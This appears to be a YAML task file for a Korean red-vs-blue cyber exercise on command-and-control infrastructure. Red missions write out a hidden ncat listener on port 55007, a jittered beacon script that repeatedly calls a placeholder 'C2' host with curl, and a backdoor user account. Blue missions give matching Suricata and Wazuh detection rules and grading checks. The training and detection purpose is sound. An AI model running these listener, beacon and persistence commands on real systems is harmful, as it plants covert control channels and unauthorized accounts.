@@ -1,0 +1,236 @@
+id: "attack-adv-w07"
+category: "attack-adv"
+title: "[공격고급 W7] C2 인프라 — 비콘·리다이렉터·은닉 vs C2 탐지"
+difficulty: "hard"
+time_limit: 3000
+battle_type: "1v1"
+description: |
+  공격 고급과정 7주차 — **C2 인프라 구축·운영**. 리스너·비콘·리다이렉터·도메인 프론팅·Malleable 프로파일·
+  지터(jitter) 등으로 지휘통제 채널을 만들고 은닉한다. Red 는 C2 를 운영하고, Blue 는 JA3/비콘/이상행위로 탐지한다.
+
+  ▸ 이야기
+    공격자가 대상 호스트에 C2 리스너(**포트 55007**)와 주기 비콘(**`/tmp/.aa07beacon`**)을 심고, 지터로 탐지를
+    회피한다. 방어자는 비표준 포트 C2 와 비콘 주기성을 탐지한다.
+
+  ▸ 모드
+    • solo : 한 학생이 C2 운영(자기 인프라 표적)과 탐지를 모두. 대상 = 본인 인프라.
+    • duel : Red 가 상대(Blue) 인프라에 C2 를 구축, Blue 는 자기 인프라에서 탐지.
+
+  ▸ 공격자 위치(중요)
+    Red 미션은 **attacker-ext(SSH 2203)** 기준. Red 채점은 **대상 인프라의 흔적(C2 포트·비콘 파일·계정)** 으로 한다.
+
+  ▸ 이번 주차 전용 마커
+    C2 리스너 포트 **55007**, 비콘 스크립트 **`/tmp/.aa07beacon`**(마커 `aa07`), 계정 **`atka07`**,
+    Suricata 탐지 **sid 9707011**, Wazuh 탐지 **id 103071**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 22
+    instruction: |
+      ## 🎯 RED-1 [C2 리스너] — HTTPS 흉내 리스너 구축
+
+      ### 상황
+      너는 대상 호스트에 정상 HTTPS 를 흉내내는 C2 리스너 **포트 55007** 을 구축한다(개념: 자체 서명 인증서로
+      암호화된 채널). 이 포트가 지휘통제 채널이 된다.
+
+      ### 할 일
+      ```bash
+      nohup ncat -lk 55007 >/dev/null 2>&1 &     # C2 리스너 (또는 openssl s_server / python)
+      ```
+
+      ### 채점 방법
+      대상 호스트에 포트 55007 이 listening 인지로 채점.
+
+      ### 합격 기준
+      대상 호스트에서 포트 55007 이 listening 이다.
+    hint: "C2 리스너 포트 55007 (HTTPS 흉내). 채점: port_listening 55007."
+    verify:
+      type: "port_listening"
+      expect: "55007"
+      checks:
+        - { id: "red-1-1", type: "port_listening", target: "web", params: { port: 55007 } }
+      semantic:
+        intent: "C2 리스너(T1071/T1573 암호화 채널) — 정상 트래픽 위장 지휘통제. 비표준 포트 C2."
+        success_criteria:
+          - "포트 55007 listening"
+          - "C2 채널 암호화/위장(자체서명 인증서 등) 서술"
+        acceptable_methods:
+          - "리스너로 55007 개방"
+        negative_signs:
+          - "포트 미개방"
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-2 [비콘 + 지속성] — 주기 체크인 비콘 + 계정
+
+      ### 상황
+      C2 의 본체는 **비콘**이다. 주기적으로 C2 에 체크인하는 비콘 스크립트 **`/tmp/.aa07beacon`**(마커 `aa07`)을
+      심고(지터로 주기 변형), 계정 **`atka07`** 으로 지속성을 둔다.
+
+      ### 할 일
+      ```bash
+      cat > /tmp/.aa07beacon <<'SH'
+      #!/bin/bash
+      # aa07 beacon: 5s +- jitter 체크인
+      while true; do curl -s http://C2/checkin >/dev/null 2>&1; sleep $((4 + RANDOM % 4)); done
+      SH
+      sudo useradd -m -s /bin/bash atka07
+      ```
+
+      ### 채점 방법
+      대상 호스트에 `/tmp/.aa07beacon`(마커 `aa07`)이 있거나 `/etc/passwd` 에 `atka07` 이 있는지로 채점.
+
+      ### 합격 기준
+      `/tmp/.aa07beacon`(마커 `aa07`) 또는 계정 `atka07`.
+    hint: "비콘 스크립트 /tmp/.aa07beacon (마커 aa07, 지터) + useradd atka07. 채점: file_contains 비콘 aa07 + file_contains passwd atka07."
+    verify:
+      type: "file_contains"
+      expect: "aa07"
+      checks:
+        - { id: "red-2-1", type: "file_contains", target: "web",
+            params: { path: "/tmp/.aa07beacon", pattern: "aa07" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "atka07" } }
+      semantic:
+        intent: "C2 비콘(T1071) + 지속성(T1136) — 주기 체크인 + 지터로 탐지 회피 + 계정."
+        success_criteria:
+          - "/tmp/.aa07beacon(마커 aa07) 또는 계정 atka07"
+          - "비콘 주기/지터가 탐지 회피에 주는 영향 서술"
+        acceptable_methods:
+          - "비콘 스크립트 + useradd"
+        negative_signs:
+          - "흔적 미생성"
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-1 [C2 포트 탐지] — Suricata 룰 (sid 9707011)
+
+      ### 상황
+      비표준 포트 C2(55007) 트래픽을 잡는 Suricata 룰(**sid 9707011**)을 만든다(개념적으로는 JA3/SNI 핑거프린팅과 병행).
+
+      ### 할 일
+      ```
+      alert tcp any any -> any 55007 (msg:"ATKADV-W07 C2 listener port 55007"; flow:to_server; sid:9707011; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+
+      ### 채점 방법
+      ips 의 `local.rules` 에 sid 9707011 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local.rules` 에 C2 포트(55007)를 보는 sid 9707011 룰이 존재한다.
+    hint: "C2 포트 Suricata 룰(sid 9707011, port 55007) → reload. JA3 병행 개념. 채점: file_contains local.rules 9707011."
+    verify:
+      type: "file_contains"
+      expect: "9707011"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9707011" } }
+      semantic:
+        intent: "C2 탐지(네트워크) — 비표준 포트 C2 Suricata 룰. JA3/SNI 핑거프린팅 병행 개념."
+        success_criteria:
+          - "local.rules 에 sid 9707011 (port 55007)"
+          - "JA3/SNI 등 암호화 C2 탐지 보조 기법 언급"
+        acceptable_methods:
+          - "Suricata 룰 작성 + reload"
+        negative_signs:
+          - "포트 불일치 / 문법 오류"
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 22
+    instruction: |
+      ## 🛡️ BLUE-2 [비콘/C2 탐지] — Wazuh 룰 (id 103071)
+
+      ### 상황
+      RED-2 의 비콘 스크립트·C2 지속성을 잡는 Wazuh 룰(**id 103071**)을 만든다.
+
+      ### 할 일
+      ```xml
+      <group name="edu,c2,">
+        <rule id="103071" level="13">
+          <if_group>edu</if_group>
+          <match>atka07</match>
+          <description>ATKADV-W07 - C2 beacon / persistence indicator</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+
+      ### 채점 방법
+      `local_rules.xml` 에 id 103071 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local_rules.xml` 에 비콘/C2 지표를 보는 id 103071 룰이 존재한다.
+    hint: "비콘/C2 Wazuh 룰(id 103071) → restart. 채점: file_contains local_rules.xml 103071."
+    verify:
+      type: "file_contains"
+      expect: "103071"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "103071" } }
+      semantic:
+        intent: "비콘/C2 탐지(호스트) — 비콘 스크립트/계정 Wazuh 룰. C2 지속성 포착."
+        success_criteria:
+          - "local_rules.xml 에 rule id 103071"
+          - "비콘/C2 지속성 탐지 로직"
+        acceptable_methods:
+          - "Wazuh 룰 작성 + restart"
+        negative_signs:
+          - "탐지 로직 부실 / XML 오류"
+
+  - order: 3
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-3 [C2 탐지 기법 분석] — JA3·비콘·지터 + 헌팅
+
+      ### 상황
+      C2 탐지를 방어자 관점에서 종합한다. JA3/JA3S 핑거프린팅, **비콘 주기성**(통신 간격 표준편차), 지터에도
+      드러나는 패턴, 도메인 프론팅 탐지 한계를 정리한다.
+
+      ### 할 일
+      보고서에:
+      - C2 탐지 기법(JA3/JA3S, 비콘 주기성 분석, DNS C2 탐지)
+      - C2 리스너(55007)·비콘(`/tmp/.aa07beacon`)·계정(atka07) 헌팅 결과
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 C2 탐지 기법/헌팅으로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ C2 탐지 기법·헌팅은 제출로 검증).
+    hint: "C2 탐지(JA3/JA3S, 비콘 주기성/표준편차, DNS C2) + C2 포트/비콘/계정 헌팅. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "C2 탐지 종합 — JA3/비콘 주기성/지터 분석 + 헌팅. 분석형 — 구체 탐지 기법 제시 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "JA3/JA3S + 비콘 주기성 + DNS C2 탐지 기법"
+          - "C2 리스너/비콘/계정 헌팅 결과"
+        acceptable_methods:
+          - "C2 탐지 기법 정리 + 헌팅"
+        negative_signs:
+          - "탐지 기법/헌팅 누락"
